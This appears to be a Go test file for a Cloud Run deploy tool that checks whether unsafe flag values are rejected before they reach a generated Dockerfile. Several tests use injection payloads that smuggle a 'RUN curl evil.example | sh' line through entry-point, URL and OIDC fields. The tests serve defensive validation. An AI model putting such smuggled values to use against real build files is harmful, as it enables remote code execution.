// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cloudrun

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"
)

// resetFlags points the package-level flags var at a fresh, minimally valid
// state for the duration of one test, restoring the previous value afterwards.
// computeFlags reads and writes that global directly, so without the restore
// one test's leftovers (an absolutised entryPointPath, a consumed tempDir)
// would be the next test's starting state.
//
// The state installed here is the zero value plus the three fields computeFlags
// needs, so a test that depends on a flag default (serverPort, which cobra
// registers as 8080) sets it itself rather than inheriting it.
func resetFlags(t *testing.T, entryPointPath, a2aAgentCardURL string) {
	t.Helper()
	saved := flags
	t.Cleanup(func() { flags = saved })

	flags = deployCloudRunFlags{}
	flags.source.entryPointPath = entryPointPath
	flags.build.tempDir = t.TempDir()
	flags.cloudRun.a2aAgentCardURL = a2aAgentCardURL
}

// allowListRejection is the part of the ValidateShellArgSafe rejection message
// that no other validator produces. The test below matches on it rather than on
// a label, because "entry point" is also a substring of the pre-existing
// StripExtension wrapper ("cannot strip '.go' extension from entry point path
// '%v'"): a payload edited to drop the .go extension would then satisfy a
// label-only assertion while saying nothing about the allow-list. It names the
// two reasons rather than the rejection itself, because the shorter sentence
// ("not allowed in a value embedded in generated Dockerfile content") is in
// ValidateDockerfileSafe's message too, and matching that would let execFile be
// downgraded to the weaker check unnoticed.
const allowListRejection = "whitespace splits COPY operands and shell metacharacters are live in a RUN line"

func TestComputeFlags_RejectsUnsafeEntryPointBasename(t *testing.T) {
	// The basename (with .go stripped) becomes f.build.execFile, which is
	// embedded directly into the generated Dockerfile's COPY/CMD lines. The
	// benign directory component is what makes the %q assertion below able to
	// tell the raw flag value from the derived basename it guards: without it
	// the two strings are byte-identical.
	maliciousEntryPoint := "cmd/quickstart/main\"\nRUN curl evil.example | sh\n#.go"
	resetFlags(t, maliciousEntryPoint, "http://127.0.0.1:8081")

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe entry point basename")
	}
	if !strings.Contains(err.Error(), allowListRejection) {
		t.Errorf("computeFlags() error = %v, want the allow-list rejection %q", err, allowListRejection)
	}
	// The checked value is derived from the flag rather than typed, so the
	// message has to carry the flag and the value as typed for the user to
	// locate it. Asserted as one string so the label cannot stay while the
	// check moves onto some other processed form of the path.
	if want := fmt.Sprintf("derived from --entry_point_path %q", maliciousEntryPoint); !strings.Contains(err.Error(), want) {
		t.Errorf("computeFlags() error = %v, want it to contain %s", err, want)
	}
}

func TestComputeFlags_RejectsUnsafeA2AAgentCardURL(t *testing.T) {
	maliciousURL := `http://127.0.0.1:8081"]` + "\nRUN curl evil.example | sh\n#"
	resetFlags(t, "main.go", maliciousURL)

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe --a2a_agent_url value")
	}
	if !strings.Contains(err.Error(), "a2a_agent_url") {
		t.Errorf("computeFlags() error = %v, want it to mention --a2a_agent_url", err)
	}
}

func TestComputeFlags_AcceptsBenignValues(t *testing.T) {
	resetFlags(t, "main.go", "http://127.0.0.1:8081")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for benign values", err)
	}
	if flags.build.execFile != "main" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "main")
	}
	// Deriving execFile above os.MkdirTemp and assigning execPath below it is
	// what keeps a rejected invocation from leaving a temp dir behind, but it
	// also means the two are no longer set together, and only the ordering puts
	// execPath inside the directory that was created. compileEntryPoint writes
	// the binary at execPath and the Dockerfile COPYs it out of the build
	// context, so an execPath that resolved against the raw --temp_dir instead
	// would fail every deploy on a missing COPY source.
	if !strings.HasPrefix(flags.build.execPath, flags.build.tempDir+"/") {
		t.Errorf("execPath = %q, want it inside the created temp dir %q", flags.build.execPath, flags.build.tempDir)
	}
}

// TestComputeFlags_AcceptsNonASCIIEntryPoint guards the deliberate decision to
// let the shell-arg allowlist admit non-ASCII runes: every byte of a multi-byte
// UTF-8 rune is >= 0x80, so none of them can be a shell metacharacter or a
// Dockerfile token separator, and rejecting them would fail deploys that work
// today.
func TestComputeFlags_AcceptsNonASCIIEntryPoint(t *testing.T) {
	resetFlags(t, "agentes/café/agenté.go", "http://127.0.0.1:8081")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for a non-ASCII entry point path", err)
	}
	if flags.build.execFile != "agenté" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "agenté")
	}
}

// TestComputeFlags_RejectsWhitespaceInExecFile guards the reason execFile keeps
// the allowlist here even though this Dockerfile has no RUN instruction. COPY
// splits its operands on whitespace, so an execFile containing a space emits
// "COPY my agent  /app/my agent" and fails the build. A space is exactly what
// ValidateDockerfileSafe permits, so relaxing execFile to it would reintroduce
// that. The tab case does not carry the argument, since both checks reject a
// control byte; it is here to cover the other whitespace character.
func TestComputeFlags_RejectsWhitespaceInExecFile(t *testing.T) {
	for _, entryPoint := range []string{"my agent.go", "my\tagent.go"} {
		resetFlags(t, entryPoint, "http://127.0.0.1:8081")

		if err := flags.computeFlags(); err == nil {
			t.Errorf("computeFlags() with entry point %q = nil, want an error: the COPY operands would not survive whitespace", entryPoint)
		}
	}
}

// TestComputeFlags_RejectionLeavesNoTempDir pins the ordering of every check
// that can fail against os.MkdirTemp. cleanTemp only runs after a fully
// successful deploy, there is no defer, so a check that fires after the temp
// dir is created leaves an empty cloudrun_<timestamp>_* directory behind on
// every rejected invocation. Nothing above os.MkdirTemp needs the directory;
// the fields that resolve against it (execPath, dockerfileBuildPath) are
// assigned below it.
//
// The third case is the one main leaks on today: StripExtension moved above
// os.MkdirTemp with the two validators, and an entry point path with no ".go"
// suffix is the only way to reach it.
func TestComputeFlags_RejectionLeavesNoTempDir(t *testing.T) {
	for name, payload := range map[string]struct {
		entryPoint, agentURL string
		set                  func(*deployCloudRunFlags)
	}{
		"unsafe entry point": {"main\"\nRUN curl evil.example | sh\n#.go", "http://127.0.0.1:8081", nil},
		"unsafe a2a url":     {"main.go", "http://127.0.0.1:8081\"]\nRUN curl evil.example | sh\n#", nil},
		"no .go extension":   {"main", "http://127.0.0.1:8081", nil},
		"unsafe oidc value": {"main.go", "http://127.0.0.1:8081", func(f *deployCloudRunFlags) {
			setValidTriggerOIDCPairs(f)
			f.cloudRun.eventarcTrigger.oidcServiceAccounts = "x\"]\nRUN curl evil.example | sh\n#"
		}},
		"lone oidc flag": {"main.go", "http://127.0.0.1:8081", func(f *deployCloudRunFlags) {
			f.cloudRun.eventarcTrigger.oidcAudience = "https://svc.run.app"
		}},
		"padded oidc audience": {"main.go", "http://127.0.0.1:8081", func(f *deployCloudRunFlags) {
			setValidTriggerOIDCPairs(f)
			f.cloudRun.eventarcTrigger.oidcAudience = "https://svc.run.app "
		}},
		"empty oidc service account entry": {"main.go", "http://127.0.0.1:8081", func(f *deployCloudRunFlags) {
			setValidTriggerOIDCPairs(f)
			f.cloudRun.eventarcTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com,"
		}},
	} {
		t.Run(name, func(t *testing.T) {
			resetFlags(t, payload.entryPoint, payload.agentURL)
			if payload.set != nil {
				payload.set(&flags)
			}
			parent := flags.build.tempDir

			if err := flags.computeFlags(); err == nil {
				t.Fatal("computeFlags() = nil, want an error")
			}
			entries, err := os.ReadDir(parent)
			if err != nil {
				t.Fatalf("cannot read the temp dir parent: %v", err)
			}
			for _, e := range entries {
				t.Errorf("rejected invocation left %q behind in the temp dir parent", e.Name())
			}
		})
	}
}

// TestPrepareDockerfile_ReadsReceiverNotGlobal is the only test in this package
// that drives prepareDockerfile from a receiver that is not the package global.
// Everywhere else the two are the same struct, so a value read off the global
// still emits the right bytes and the drift the receiver conversion removed
// would come back silently. Here the global holds different values, so a single
// flags.cloudRun read turns this red, for every value and every branch
// condition prepareDockerfile has, not just the ones the allowlist guards.
func TestPrepareDockerfile_ReadsReceiverNotGlobal(t *testing.T) {
	const (
		receiverPort = 9091
		receiverURL  = "http://127.0.0.1:9099"
		proxyPort    = 9098
	)
	// The global: a different port, a different --a2a_agent_url, a different
	// executable name, a different proxy port, and every optional block left
	// off. The last one is what pins the branch conditions as well as the
	// values: a prepareDockerfile that tested flags.cloudRun.a2a would skip the
	// block that carries the URL entirely.
	resetFlags(t, "main.go", "http://127.0.0.1:8081")
	flags.cloudRun.serverPort = 8080
	flags.build.execFile = "other"
	flags.proxy.port = 8000

	// Every optional block on, each with a value the global does not hold.
	f := &deployCloudRunFlags{}
	f.build.execFile = "main"
	f.build.dockerfileBuildPath = filepath.Join(t.TempDir(), "Dockerfile")
	f.cloudRun.serverPort = receiverPort
	f.proxy.port = proxyPort
	f.cloudRun.a2a = true
	f.cloudRun.a2aAgentCardURL = receiverURL
	f.cloudRun.api = true
	f.cloudRun.debugAPI = true
	f.cloudRun.webui = true
	f.cloudRun.pubsub = true
	f.cloudRun.pubsubTrigger = triggerConfigFlags{maxRetries: 11, baseDelay: 2 * time.Second, maxDelay: 33 * time.Second, maxRuns: 44}
	f.cloudRun.eventarc = true
	f.cloudRun.eventarcTrigger = triggerConfigFlags{maxRetries: 55, baseDelay: 6 * time.Second, maxDelay: 47 * time.Second, maxRuns: 88}

	if err := f.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() = %v, want no error", err)
	}
	content, err := os.ReadFile(f.build.dockerfileBuildPath)
	if err != nil {
		t.Fatalf("cannot read the generated Dockerfile: %v", err)
	}
	if !strings.Contains(string(content), "\nEXPOSE 9091\n") {
		t.Errorf("Dockerfile does not EXPOSE the receiver's server port:\n%s", content)
	}
	if !strings.Contains(string(content), receiverURL) {
		t.Errorf("Dockerfile does not carry the receiver's --a2a_agent_url:\n%s", content)
	}
	// execFile is the value the strict allow-list exists for in this package:
	// it is both COPY operands and the CMD argv[0]. Nothing else in the file
	// distinguishes a receiver read from a global one for it.
	if !strings.Contains(string(content), "\nCOPY main  /app/main\n") {
		t.Errorf("Dockerfile does not COPY the receiver's execFile:\n%s", content)
	}
	if !strings.Contains(string(content), `["/app/main", "web"`) {
		t.Errorf("Dockerfile CMD does not run the receiver's execFile:\n%s", content)
	}
	// The rest of the CMD array, one assertion per optional block, asserted as
	// the whole emitted segment so each covers its branch condition and every
	// value inside it. Nothing can be injected through these, since they are
	// ints, durations and bools, but they are the remainder of the same property,
	// and no other test in this package sets the flags that emit them.
	for name, want := range map[string]string{
		"api":      `, "api", "-webui_address", "127.0.0.1:9098", "-include_debug_api"`,
		"webui":    `, "webui", "--api_server_address", "http://127.0.0.1:9098/api"`,
		"pubsub":   `, "pubsub", "--trigger_max_retries", "11", "--trigger_base_delay", "2s", "--trigger_max_delay", "33s", "--trigger_max_concurrent_runs", "44"`,
		"eventarc": `, "eventarc", "--trigger_max_retries", "55", "--trigger_base_delay", "6s", "--trigger_max_delay", "47s", "--trigger_max_concurrent_runs", "88"`,
	} {
		if !strings.Contains(string(content), want) {
			t.Errorf("Dockerfile CMD does not carry the receiver's %s block %s:\n%s", name, want, content)
		}
	}
}

// TestPrepareDockerfile_A2AURLReachesCMDArray runs the branch that interpolates
// --a2a_agent_url, which only fires when --a2a is set, and checks the emitted
// CMD is still a parseable JSON array carrying the value. Without this the
// validator and the line it protects are only connected by reading the code.
func TestPrepareDockerfile_A2AURLReachesCMDArray(t *testing.T) {
	const agentURL = "http://127.0.0.1:8081"
	resetFlags(t, "main.go", agentURL)
	flags.cloudRun.a2a = true
	flags.cloudRun.serverPort = 8080

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error", err)
	}
	if err := flags.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() = %v, want no error", err)
	}

	content, err := os.ReadFile(flags.build.dockerfileBuildPath)
	if err != nil {
		t.Fatalf("cannot read the generated Dockerfile: %v", err)
	}
	var cmdLine string
	for _, line := range strings.Split(string(content), "\n") {
		if rest, ok := strings.CutPrefix(line, "CMD "); ok {
			cmdLine = rest
		}
	}
	if cmdLine == "" {
		t.Fatalf("no CMD instruction in the generated Dockerfile:\n%s", content)
	}

	var args []string
	if err := json.Unmarshal([]byte(cmdLine), &args); err != nil {
		t.Fatalf("CMD %s does not parse as a JSON array: %v", cmdLine, err)
	}
	if !slices.Contains(args, agentURL) {
		t.Errorf("CMD args = %q, want them to carry %q", args, agentURL)
	}
}

// TestPrepareDockerfile_BindsAllInterfaces guards that the generated Cloud Run
// container opts back into all interfaces. The web server binds loopback by
// default, so a container that keeps that default is unreachable from the
// Cloud Run front end.
func TestPrepareDockerfile_BindsAllInterfaces(t *testing.T) {
	resetFlags(t, "main.go", "")
	flags.cloudRun.serverPort = 8080

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error", err)
	}
	if err := flags.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() = %v, want no error", err)
	}

	content, err := os.ReadFile(flags.build.dockerfileBuildPath)
	if err != nil {
		t.Fatalf("cannot read the generated Dockerfile: %v", err)
	}
	var cmdLine string
	for _, line := range strings.Split(string(content), "\n") {
		if rest, ok := strings.CutPrefix(line, "CMD "); ok {
			cmdLine = rest
		}
	}
	if cmdLine == "" {
		t.Fatalf("no CMD instruction in the generated Dockerfile:\n%s", content)
	}

	var args []string
	if err := json.Unmarshal([]byte(cmdLine), &args); err != nil {
		t.Fatalf("CMD %s does not parse as a JSON array: %v", cmdLine, err)
	}
	host := ""
	for i, arg := range args {
		if arg == "-host" && i+1 < len(args) {
			host = args[i+1]
		}
	}
	if host != "0.0.0.0" {
		t.Errorf("CMD args = %q, want -host 0.0.0.0 so Cloud Run can reach the server", args)
	}
	if !slices.Contains(args, "8080") {
		t.Errorf("CMD args = %q, want them to carry the server port %q", args, "8080")
	}
}

func TestPrepareDockerfile_ForwardsTriggerOIDCFlags(t *testing.T) {
	f := &deployCloudRunFlags{}
	f.build.execFile = "main"
	f.build.dockerfileBuildPath = filepath.Join(t.TempDir(), "Dockerfile")
	f.cloudRun.pubsub = true
	f.cloudRun.pubsubTrigger = triggerConfigFlags{
		maxRetries: 1, maxDelay: time.Second, maxRuns: 1,
		oidcAudience: "https://Svc.run.app/api/apps/A/trigger/pubsub", oidcServiceAccounts: "Push@p.iam.gserviceaccount.com",
	}
	f.cloudRun.eventarc = true
	f.cloudRun.eventarcTrigger = triggerConfigFlags{
		maxRetries: 1, maxDelay: time.Second, maxRuns: 1,
		oidcAudience: "https://svc.run.app", oidcServiceAccounts: "a@p.iam.gserviceaccount.com,B@p.iam.gserviceaccount.com",
	}

	if err := f.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() = %v, want no error", err)
	}
	content, err := os.ReadFile(f.build.dockerfileBuildPath)
	if err != nil {
		t.Fatalf("cannot read the generated Dockerfile: %v", err)
	}
	// Each pair must follow its own sublauncher keyword, since both sublaunchers
	// accept the same flag names.
	for _, want := range []string{
		`"--trigger_max_concurrent_runs", "1", "-oidc_audience", "https://Svc.run.app/api/apps/A/trigger/pubsub", "-oidc_service_accounts", "Push@p.iam.gserviceaccount.com", "eventarc"`,
		`"--trigger_max_concurrent_runs", "1", "-oidc_audience", "https://svc.run.app", "-oidc_service_accounts", "a@p.iam.gserviceaccount.com,B@p.iam.gserviceaccount.com"]`,
	} {
		if !strings.Contains(string(content), want) {
			t.Errorf("Dockerfile CMD does not carry %s:\n%s", want, content)
		}
	}
}

func TestPrepareDockerfile_OmitsUnsetTriggerOIDCFlags(t *testing.T) {
	f := &deployCloudRunFlags{}
	f.build.execFile = "main"
	f.build.dockerfileBuildPath = filepath.Join(t.TempDir(), "Dockerfile")
	f.cloudRun.pubsub = true
	f.cloudRun.eventarc = true

	if err := f.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() = %v, want no error", err)
	}
	content, err := os.ReadFile(f.build.dockerfileBuildPath)
	if err != nil {
		t.Fatalf("cannot read the generated Dockerfile: %v", err)
	}
	if strings.Contains(string(content), "oidc") {
		t.Errorf("Dockerfile carries OIDC flags that were never set:\n%s", content)
	}
}

// dockerfileRejection is the part of ValidateDockerfileSafe's message for a
// disallowed character that no other check in computeFlags produces.
const dockerfileRejection = "(quote, backtick, backslash, or a control character)"

// setValidTriggerOIDCPairs sets a valid OIDC pair on both triggers.
func setValidTriggerOIDCPairs(f *deployCloudRunFlags) {
	f.cloudRun.pubsubTrigger.oidcAudience = "https://svc.run.app"
	f.cloudRun.pubsubTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com"
	f.cloudRun.eventarcTrigger.oidcAudience = "https://svc.run.app"
	f.cloudRun.eventarcTrigger.oidcServiceAccounts = "b@p.iam.gserviceaccount.com"
}

func TestComputeFlags_RejectsUnsafeTriggerOIDCValues(t *testing.T) {
	const payload = `x"]` + "\nRUN curl evil.example | sh\n#"
	for _, tc := range []struct {
		flag string
		set  func(*deployCloudRunFlags)
	}{
		{"--pubsub_oidc_audience", func(f *deployCloudRunFlags) { f.cloudRun.pubsubTrigger.oidcAudience = payload }},
		{"--pubsub_oidc_service_accounts", func(f *deployCloudRunFlags) { f.cloudRun.pubsubTrigger.oidcServiceAccounts = payload }},
		{"--eventarc_oidc_audience", func(f *deployCloudRunFlags) { f.cloudRun.eventarcTrigger.oidcAudience = payload }},
		{"--eventarc_oidc_service_accounts", func(f *deployCloudRunFlags) { f.cloudRun.eventarcTrigger.oidcServiceAccounts = payload }},
	} {
		t.Run(tc.flag, func(t *testing.T) {
			resetFlags(t, "main.go", "http://127.0.0.1:8081")
			// Complete pairs, so the both-or-neither check cannot answer for
			// the Dockerfile check.
			setValidTriggerOIDCPairs(&flags)
			tc.set(&flags)

			err := flags.computeFlags()
			if err == nil {
				t.Fatalf("computeFlags() = nil, want an error rejecting the unsafe %s value", tc.flag)
			}
			if !strings.Contains(err.Error(), tc.flag) || !strings.Contains(err.Error(), dockerfileRejection) {
				t.Errorf("computeFlags() error = %v, want the Dockerfile-safety rejection of %s", err, tc.flag)
			}
		})
	}
}

func TestComputeFlags_RejectsLoneTriggerOIDCFlag(t *testing.T) {
	for _, tc := range []struct {
		name string
		set  func(*deployCloudRunFlags)
		want string
	}{
		{"pubsub audience only", func(f *deployCloudRunFlags) { f.cloudRun.pubsubTrigger.oidcAudience = "https://svc.run.app" }, "--pubsub_oidc_service_accounts"},
		{"pubsub service accounts only", func(f *deployCloudRunFlags) {
			f.cloudRun.pubsubTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com"
		}, "--pubsub_oidc_audience"},
		{"eventarc audience only", func(f *deployCloudRunFlags) { f.cloudRun.eventarcTrigger.oidcAudience = "https://svc.run.app" }, "--eventarc_oidc_service_accounts"},
		{"eventarc service accounts only", func(f *deployCloudRunFlags) {
			f.cloudRun.eventarcTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com"
		}, "--eventarc_oidc_audience"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			resetFlags(t, "main.go", "http://127.0.0.1:8081")
			tc.set(&flags)

			err := flags.computeFlags()
			if err == nil {
				t.Fatal("computeFlags() = nil, want an error for the missing half of the pair")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("computeFlags() error = %v, want it to name %s", err, tc.want)
			}
		})
	}
}

// Each of these passes the Dockerfile check and the pair check, and the
// sublauncher refuses it when the container starts.
func TestComputeFlags_RejectsTriggerOIDCValuesTheSublauncherRefuses(t *testing.T) {
	for _, tc := range []struct {
		name string
		set  func(*deployCloudRunFlags)
		want string
	}{
		{"pubsub audience with trailing space", func(f *deployCloudRunFlags) { f.cloudRun.pubsubTrigger.oidcAudience = "https://svc.run.app " }, "--pubsub_oidc_audience"},
		{"eventarc audience with leading space", func(f *deployCloudRunFlags) { f.cloudRun.eventarcTrigger.oidcAudience = " https://svc.run.app" }, "--eventarc_oidc_audience"},
		{"pubsub trailing comma", func(f *deployCloudRunFlags) {
			f.cloudRun.pubsubTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com,"
		}, "--pubsub_oidc_service_accounts"},
		{"eventarc blank middle entry", func(f *deployCloudRunFlags) {
			f.cloudRun.eventarcTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com, ,b@p.iam.gserviceaccount.com"
		}, "--eventarc_oidc_service_accounts"},
		{"pubsub only a space", func(f *deployCloudRunFlags) { f.cloudRun.pubsubTrigger.oidcServiceAccounts = " " }, "--pubsub_oidc_service_accounts"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			resetFlags(t, "main.go", "http://127.0.0.1:8081")
			setValidTriggerOIDCPairs(&flags)
			tc.set(&flags)

			err := flags.computeFlags()
			if err == nil {
				t.Fatal("computeFlags() = nil, want an error")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("computeFlags() error = %v, want it to name %s", err, tc.want)
			}
		})
	}
}

// triggerFlagAlphabet is the input domain of TestValidateTriggerOIDCMatchesReference:
// letters of both cases, the list separator, and four characters that
// strings.TrimSpace removes (space, tab, U+00A0 and U+3000).
var triggerFlagAlphabet = []string{"a", "B", ",", " ", "\t", "\u00a0", "\u3000"}

func isReferenceSpace(r rune) bool {
	return r == ' ' || r == '\t' || r == '\u00a0' || r == '\u3000'
}

// allStrings returns every string of zero to n symbols from alphabet.
func allStrings(alphabet []string, n int) []string {
	out := []string{""}
	last := []string{""}
	for range n {
		var next []string
		for _, prefix := range last {
			for _, c := range alphabet {
				next = append(next, prefix+c)
			}
		}
		out = append(out, next...)
		last = next
	}
	return out
}

// referenceAccepts states, independently of validateTriggerOIDC, what a deploy
// may forward: no control character (the Dockerfile rule), both flags or
// neither, no space at either end of the audience, and no list entry that is
// empty once spaces are removed (the sublauncher's startup rules).
func referenceAccepts(audience, accounts string) bool {
	for _, r := range audience + accounts {
		if r < 0x20 {
			return false
		}
	}
	if audience == "" && accounts == "" {
		return true
	}
	if audience == "" || accounts == "" {
		return false
	}
	aud := []rune(audience)
	if isReferenceSpace(aud[0]) || isReferenceSpace(aud[len(aud)-1]) {
		return false
	}
	nonSpace := false
	for _, r := range accounts + "," {
		switch {
		case r == ',':
			if !nonSpace {
				return false
			}
			nonSpace = false
		case !isReferenceSpace(r):
			nonSpace = true
		}
	}
	return true
}

// Over every audience of up to two symbols and every service-account list of up
// to four symbols from triggerFlagAlphabet, validateTriggerOIDC rejects exactly
// what the reference rejects.
func TestValidateTriggerOIDCMatchesReference(t *testing.T) {
	lists := allStrings(triggerFlagAlphabet, 4)
	for _, audience := range allStrings(triggerFlagAlphabet, 2) {
		for _, accounts := range lists {
			err := validateTriggerOIDC("pubsub", triggerConfigFlags{oidcAudience: audience, oidcServiceAccounts: accounts})
			if want := referenceAccepts(audience, accounts); (err == nil) != want {
				t.Fatalf("validateTriggerOIDC(%q, %q) = %v, want accepted = %v", audience, accounts, err, want)
			}
		}
	}
}

func TestComputeFlags_AcceptsCompleteTriggerOIDCPairs(t *testing.T) {
	resetFlags(t, "main.go", "http://127.0.0.1:8081")
	flags.cloudRun.pubsubTrigger.oidcAudience = "https://svc.run.app"
	flags.cloudRun.pubsubTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com"
	flags.cloudRun.eventarcTrigger.oidcAudience = "https://svc.run.app"
	// The sublauncher trims each entry, so spaces around one are fine.
	flags.cloudRun.eventarcTrigger.oidcServiceAccounts = "b@p.iam.gserviceaccount.com , c@p.iam.gserviceaccount.com"

	if err := flags.computeFlags(); err != nil {
		t.Errorf("computeFlags() = %v, want no error", err)
	}
}

// With several unsafe values the error must name the same flag every time, so
// fixing the one it names is progress.
func TestComputeFlags_ReportsUnsafeTriggerOIDCValuesInFixedOrder(t *testing.T) {
	const payload = `x"`
	for range 20 {
		resetFlags(t, "main.go", "http://127.0.0.1:8081")
		flags.cloudRun.pubsubTrigger.oidcAudience = payload
		flags.cloudRun.pubsubTrigger.oidcServiceAccounts = payload
		flags.cloudRun.eventarcTrigger.oidcAudience = payload
		flags.cloudRun.eventarcTrigger.oidcServiceAccounts = payload

		err := flags.computeFlags()
		if err == nil || !strings.Contains(err.Error(), "--pubsub_oidc_audience") {
			t.Fatalf("computeFlags() error = %v, want it to name --pubsub_oidc_audience first", err)
		}
	}
}

func TestCloudRunCommandBindsTriggerOIDCFlags(t *testing.T) {
	resetFlags(t, "main.go", "http://127.0.0.1:8081")

	if err := cloudrunCmd.ParseFlags([]string{
		"--pubsub_oidc_audience=pubsub-aud",
		"--pubsub_oidc_service_accounts=pubsub-sa",
		"--eventarc_oidc_audience=eventarc-aud",
		"--eventarc_oidc_service_accounts=eventarc-sa",
	}); err != nil {
		t.Fatalf("ParseFlags() = %v", err)
	}

	for _, c := range []struct{ name, got, want string }{
		{"pubsub audience", flags.cloudRun.pubsubTrigger.oidcAudience, "pubsub-aud"},
		{"pubsub service accounts", flags.cloudRun.pubsubTrigger.oidcServiceAccounts, "pubsub-sa"},
		{"eventarc audience", flags.cloudRun.eventarcTrigger.oidcAudience, "eventarc-aud"},
		{"eventarc service accounts", flags.cloudRun.eventarcTrigger.oidcServiceAccounts, "eventarc-sa"},
	} {
		if c.got != c.want {
			t.Errorf("%s = %q, want %q", c.name, c.got, c.want)
		}
	}
}
